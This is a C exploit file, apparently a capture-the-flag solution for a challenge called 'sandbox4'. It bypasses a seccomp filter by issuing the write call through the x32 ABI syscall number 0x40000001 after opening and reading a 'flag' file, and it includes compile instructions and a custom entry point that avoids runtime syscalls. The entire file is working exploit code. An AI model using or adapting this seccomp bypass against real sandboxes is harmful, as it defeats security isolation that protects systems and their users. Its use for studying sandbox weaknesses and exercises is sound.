// sploit4.c
// This exploit for sandbox4 leverages the x32 ABI's write syscall to bypass seccomp restrictions.
// It opens the flag file using openat, reads its contents into a buffer,
// and then uses the x32 write syscall (number 0x40000001) to write the flag to stdout.
// To avoid extra (potentially disallowed) syscalls from the C runtime, we define our own _start.
// 
// Compile with:
//     gcc -mx32 -static -nostdlib -O2 -o sploit4 sploit4.c
//
// This solution assumes that your kernel supports the x32 ABI.

//
// Minimal type definition for ssize_t in x32 (usually a 32-bit signed integer)
typedef int ssize_t;

//
// Definitions for flags and constants
//
#define O_RDONLY    0
#define AT_FDCWD   (-100)

//
// Syscall numbers (for x32, these are the same as x86_64 for many calls)
//
#define SYS_openat      257
#define SYS_read          0
#define SYS_close         3
#define SYS_exit_group   231

//
// 32-bit ABI Syscall Wrapper for x32
// In the x32 ABI, the registers and calling conventions are similar to x86_64,
// but pointers and syscall arguments are 32-bit. We assume that our compiler,
// when using -mx32, will generate proper 32-bit code.
// This minimal wrapper uses inline assembly to invoke a syscall.
static inline int sys_x32(int num, int a1, int a2, int a3, int a4, int a5, int a6) {
    int ret;
    __asm__ volatile (
         "syscall"
         : "=a"(ret)
         : "a"(num), "D"(a1), "S"(a2), "d"(a3),
           "r"(a4), "r"(a5), "r"(a6)
         : "rcx", "r11", "memory"
    );
    return ret;
}

//
// Custom _start entry point.
// In the x32 ABI, the stack layout is similar to standard C: 
// [0] argc (32-bit), [1] pointer to argv[0], etc.
void _start(void) {
    // Retrieve the stack pointer.
    int *stack_ptr;
    __asm__("movl %%esp, %0" : "=r"(stack_ptr));

    // Get argc and argv (assuming they are 32-bit values in x32).
    int argc = stack_ptr[0];
    char **argv = (char **)(stack_ptr + 1);

    // Open the flag file using openat.
    int fd = sys_x32(SYS_openat, AT_FDCWD, (int)"flag", O_RDONLY, 0, 0, 0);
    if (fd < 0) {
        sys_x32(SYS_exit_group, 1, 0, 0, 0, 0, 0);
    }

    // Read the flag into a buffer.
    char buf[1024];
    ssize_t n = sys_x32(SYS_read, fd, (int)buf, sizeof(buf), 0, 0, 0);
    sys_x32(SYS_close, fd, 0, 0, 0, 0, 0);
    if (n <= 0) {
        sys_x32(SYS_exit_group, 1, 0, 0, 0, 0, 0);
    }

    // Use x32 ABI write syscall (number 0x40000001) to write to stdout (fd 1).
    // The x32 write syscall number is 0x40000001.
    sys_x32(0x40000001, 1, (int)buf, n, 0, 0, 0);

    sys_x32(SYS_exit_group, 0, 0, 0, 0, 0, 0);
}
